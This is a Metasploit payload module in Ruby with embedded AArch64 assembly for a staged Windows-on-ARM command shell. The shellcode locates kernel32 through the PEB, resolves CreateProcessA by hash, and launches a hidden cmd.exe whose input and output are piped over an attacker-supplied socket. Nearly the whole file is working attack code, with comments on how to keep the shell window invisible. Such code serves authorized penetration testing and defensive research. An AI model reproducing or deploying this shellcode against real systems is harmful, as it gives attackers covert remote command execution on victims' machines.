# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Windows
  include Msf::Payload::Windows::Aarch64
  include Msf::Payload::Windows::Exitfunk_Aarch64
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows AArch64 Command Shell',
        'Description' => %q{
          Spawn a piped command shell on Windows on ARM (AArch64) (staged).
          Expects an open TCP socket handle in x0 at entry (convention sockx0).
          Resolves CreateProcessA via PEB / Export Address Table hashing and
          launches cmd.exe with stdin/stdout/stderr redirected to the socket
          via STARTF_USESTDHANDLES.
        },
        'Author' => [ 'vinicius-batistella' ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_AARCH64,
        'Session' => Msf::Sessions::CommandShellWindows,
        'PayloadCompat' => {
          'Convention' => 'sockx0'
        },
        'Stage' => {
          'Payload' => ''
        }
      )
    )
  end

  def generate_stage(_opts = {})
    asm = build_stage_asm(exitfunk: datastore['EXITFUNC'])
    compile_aarch64(asm)
  end

  private

  def build_stage_asm(exitfunk:)
    asm = <<~ASM
      main:
        mov     x22, x0
        sub     sp, sp, #0x100
        mov     x29, sp
      find_kernel32:
        ldr     x6, [x18, #0x60]
        ldr     x6, [x6,  #0x18]
        ldr     x6, [x6,  #0x30]
      next_module:
        ldr     x3, [x6, #0x10]
        ldr     x7, [x6, #0x40]
        ldr     x6, [x6]
        ldrh    w8, [x7, #24]
        cbnz    w8, next_module
      find_function_shorten:
        b       find_function_shorten_bnc
      find_function_ret:
        str     x30, [x29, #0x08]
        b       resolve_symbols_kernel32
      find_function_shorten_bnc:
        bl      find_function_ret
      find_function:
        mov     w10, w0
        ldr     w8,  [x3, #0x3c]
        add     x8,  x8, x3
        ldr     w9,  [x8, #0x88]
        add     x9,  x9, x3
        ldr     w4,  [x9, #0x18]
        ldr     w11, [x9, #0x20]
        add     x11, x11, x3
      find_function_loop:
        cbz     w4, find_function_finished
        sub     w4, w4, #1
        mov     w15, w4
        lsl     x15, x15, #2
        add     x15, x11, x15
        ldr     w12, [x15]
        add     x6,  x12, x3
      compute_hash:
        mov     w5, wzr
      compute_hash_again:
        ldrb    w0, [x6], #1
        cbz     w0, compute_hash_finished
        ror     w5, w5, #13
        add     w5, w5, w0
        b       compute_hash_again
      compute_hash_finished:
      find_function_compare:
        cmp     w5, w10
        b.ne    find_function_loop
        ldr     w12, [x9, #0x24]
        add     x12, x12, x3
        mov     w15, w4
        lsl     x15, x15, #1
        add     x15, x12, x15
        ldrh    w4,  [x15]
        ldr     w12, [x9, #0x1c]
        add     x12, x12, x3
        mov     w15, w4
        lsl     x15, x15, #2
        add     x15, x12, x15
        ldr     w13, [x15]
        add     x0,  x13, x3
      find_function_finished:
        ret
      resolve_symbols_kernel32:
        str     x3, [x29, #0x00]
        movz    w0, #0xfe72
        movk    w0, #0x16b3, lsl #16
        ldr     x9, [x29, #0x08]
        blr     x9
        str     x0, [x29, #0x40]
      build_PROCESS_INFORMATION_and_STARTUPINFOA:
        sub     sp, sp, #0xB0
        add     x10, sp, #0x10
        add     x11, sp, #0x30
        add     x12, sp, #0xA0
        stp     xzr, xzr, [x10]
        str     xzr, [x10, #16]
        stp     xzr, xzr, [x11, #0x00]
        stp     xzr, xzr, [x11, #0x10]
        stp     xzr, xzr, [x11, #0x20]
        stp     xzr, xzr, [x11, #0x30]
        stp     xzr, xzr, [x11, #0x40]
        stp     xzr, xzr, [x11, #0x50]
        str     xzr,      [x11, #0x60]
        mov     w0, #0x68
        str     w0, [x11, #0x00]
        // STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; wShowWindow stays 0 (SW_HIDE)
        mov     w0, #0x101
        str     w0, [x11, #0x3C]
        str     x22, [x11, #0x50]
        str     x22, [x11, #0x58]
        str     x22, [x11, #0x60]
        movz    x0, #0x6D63
        movk    x0, #0x2E64, lsl #16
        movk    x0, #0x7865, lsl #32
        movk    x0, #0x0065, lsl #48
        str     x0, [x12]
      call_CreateProcessA:
        mov     x0, xzr
        mov     x1, x12
        mov     x2, xzr
        mov     x3, xzr
        mov     w4, #1
        // CREATE_NO_WINDOW — hides cmd/conhost on modern Windows (0x101 alone is not enough)
        movz    w5, #0x0800, lsl #16
        mov     x6, xzr
        mov     x7, xzr
        stp     x11, x10, [sp]
        ldr     x9, [x29, #0x40]
        blr     x9
        add     sp, sp, #0xB0
    ASM
    asm + asm_exitfunk_aarch64(exitfunk: exitfunk)
  end
end
